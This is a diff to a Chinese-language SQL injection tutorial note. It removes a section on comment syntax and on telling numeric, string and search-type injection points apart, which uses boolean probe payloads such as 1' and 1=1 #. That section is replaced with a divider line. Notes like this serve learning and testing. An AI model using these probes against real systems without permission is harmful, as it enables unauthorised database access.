@@ -1,32 +1,6 @@
 ### 回显注入：
 能够在页面中查看到结果
-
-SQL语句中注释：
-```
-1. #
-2. -- （注意空格）
-```
-首先判断注入类型：
-- 数字型
-```
-SELECT * FROM users WHERE id=$id     
-        1 and 1=1; 
-        1 and 1=2;
-```
-- 字符型
-```
-SELECT * FROM users WHERE id='$id'
-SELECT * FROM users WHERE id="$id"
-        1' and 1=1 #; 1' and 1=2 # （注：#是为了注释掉后面的'）
-        1" and 1=1 #; 1" and 1=2 # （注：#是为了注释掉后面的"）
-```
-- 搜索型
-```
-SELECT * FROM users WHERE id like '%$id%';
-SELECT * FROM users WHERE id like "%$id%";
-        xxx%' and 1=1 #; xxx%' and 1=2 #
-        xxx%" and 1=1 #; xxx%" and 1=2 #
-```
+#############################
 --- 猜解SQL查询语句中的字段数：
 ```
 SELECT * FROM users WHERE id=$id
